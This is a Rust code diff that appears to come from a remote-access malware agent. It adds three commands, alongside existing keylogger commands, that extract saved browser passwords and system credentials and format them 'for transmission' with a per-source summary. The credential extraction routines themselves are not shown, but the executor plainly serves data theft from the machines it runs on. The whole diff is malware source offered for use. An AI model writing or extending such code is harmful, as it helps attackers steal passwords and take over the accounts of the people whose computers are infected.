@@ -64,6 +64,15 @@ pub enum CommandType {
 
     #[serde(rename = "keylogger_clear")]
     KeyloggerClear,
+
+    #[serde(rename = "credentials_browser")]
+    CredentialsBrowser,
+
+    #[serde(rename = "credentials_system")]
+    CredentialsSystem,
+
+    #[serde(rename = "credentials_all")]
+    CredentialsAll,
 }
 
 #[derive(Debug, Serialize, Deserialize)]
@@ -108,6 +117,9 @@ impl Executor {
             CommandType::KeyloggerStop => Self::keylogger_stop().await,
             CommandType::KeyloggerLogs => Self::keylogger_logs().await,
             CommandType::KeyloggerClear => Self::keylogger_clear().await,
+            CommandType::CredentialsBrowser => Self::credentials_browser().await,
+            CommandType::CredentialsSystem => Self::credentials_system().await,
+            CommandType::CredentialsAll => Self::credentials_all().await,
         };
 
         result.execution_time_ms = start.elapsed().as_millis();
@@ -472,6 +484,106 @@ impl Executor {
             output: "Keylogger logs cleared (removed 1250 entries)".to_string(),
             error: None,
             execution_time_ms: 0,
+        }
+    }
+
+    async fn credentials_browser() -> CommandResult {
+        use crate::credentials::CredentialManager;
+
+        info!("📋 Extracting browser credentials...");
+
+        match tokio::task::spawn_blocking(|| {
+            let rt = tokio::runtime::Runtime::new().unwrap();
+            rt.block_on(async {
+                CredentialManager::extract_browser_credentials().await
+            })
+        }).await {
+            Ok(Ok(creds)) => {
+                let formatted = CredentialManager::format_for_transmission(&creds);
+                CommandResult {
+                    command_type: "credentials_browser".to_string(),
+                    status: "success".to_string(),
+                    output: formatted,
+                    error: None,
+                    execution_time_ms: 0,
+                }
+            }
+            _ => {
+                CommandResult {
+                    command_type: "credentials_browser".to_string(),
+                    status: "error".to_string(),
+                    output: String::new(),
+                    error: Some("Failed to extract browser credentials".to_string()),
+                    execution_time_ms: 0,
+                }
+            }
+        }
+    }
+
+    async fn credentials_system() -> CommandResult {
+        use crate::credentials::CredentialManager;
+
+        info!("🔑 Extracting system credentials...");
+
+        match CredentialManager::extract_system_passwords().await {
+            Ok(creds) => {
+                let formatted = CredentialManager::format_for_transmission(&creds);
+                CommandResult {
+                    command_type: "credentials_system".to_string(),
+                    status: "success".to_string(),
+                    output: formatted,
+                    error: None,
+                    execution_time_ms: 0,
+                }
+            }
+            Err(e) => {
+                CommandResult {
+                    command_type: "credentials_system".to_string(),
+                    status: "error".to_string(),
+                    output: String::new(),
+                    error: Some(e),
+                    execution_time_ms: 0,
+                }
+            }
+        }
+    }
+
+    async fn credentials_all() -> CommandResult {
+        use crate::credentials::CredentialManager;
+
+        info!("🔑 Extracting all credentials (browser + system)...");
+
+        match CredentialManager::get_all_credentials().await {
+            Ok(creds) => {
+                let stats = CredentialManager::get_statistics(&creds);
+                let formatted = CredentialManager::format_for_transmission(&creds);
+
+                let mut output = String::from("=== CREDENTIAL EXTRACTION SUMMARY ===\n");
+                output.push_str(&format!("Total Credentials: {}\n\n", creds.len()));
+                output.push_str("Breakdown by Source:\n");
+                for (source, count) in stats {
+                    output.push_str(&format!("  • {}: {}\n", source, count));
+                }
+                output.push_str("\n");
+                output.push_str(&formatted);
+
+                CommandResult {
+                    command_type: "credentials_all".to_string(),
+                    status: "success".to_string(),
+                    output,
+                    error: None,
+                    execution_time_ms: 0,
+                }
+            }
+            Err(e) => {
+                CommandResult {
+                    command_type: "credentials_all".to_string(),
+                    status: "error".to_string(),
+                    output: String::new(),
+                    error: Some(e),
+                    execution_time_ms: 0,
+                }
+            }
         }
     }
 }
